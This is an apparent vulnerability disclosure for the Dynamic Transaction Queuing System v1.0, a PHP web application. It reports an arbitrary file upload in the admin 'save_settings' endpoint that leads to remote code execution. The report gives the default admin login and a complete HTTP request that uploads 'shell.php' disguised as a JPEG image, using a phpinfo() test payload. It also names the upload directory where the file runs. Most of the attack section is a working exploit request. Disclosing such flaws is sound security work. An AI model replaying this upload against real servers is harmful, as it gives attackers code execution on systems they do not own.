# Dynamic Transaction Queuing System v1.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author: ATKF

vendors: https://www.sourcecodester.com/php/14479/dynamic-transaction-queuing-system-using-phpmysql-source-code.html

The program is built using the xmapp-php8.1 version

Login account: admin/admin123 (Super Admin account)

Vulnerability url: ip/queuing/admin/ajax.php?action=save_settings

Loophole location: Dynamic Transaction Queuing System's "/queuing/admin/ajax.php?action=save_settings" file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /queuing/admin/ajax.php?action=save_settings HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/queuing/admin/index.php?page=site_settings
Content-Length: 603
Content-Type: multipart/form-data; boundary=---------------------------62511349610243
Cookie: PHPSESSID=t4551shae3529036q2g0j8luub
Connection: close

-----------------------------62511349610243
Content-Disposition: form-data; name="name"

admin
-----------------------------62511349610243
Content-Disposition: form-data; name="email"

1@qq.com
-----------------------------62511349610243
Content-Disposition: form-data; name="contact"

11
-----------------------------62511349610243
Content-Disposition: form-data; name="about"


-----------------------------62511349610243
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------62511349610243--
```

The files will be uploaded to this directory \queuing\admin\assets\img\
![image](https://user-images.githubusercontent.com/54017627/199706548-c6f92273-97da-4b8d-a32b-25d05fa1468c.png)


We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/199706600-9232fc0f-3672-4d07-b0a2-3da4fd0758cd.png)

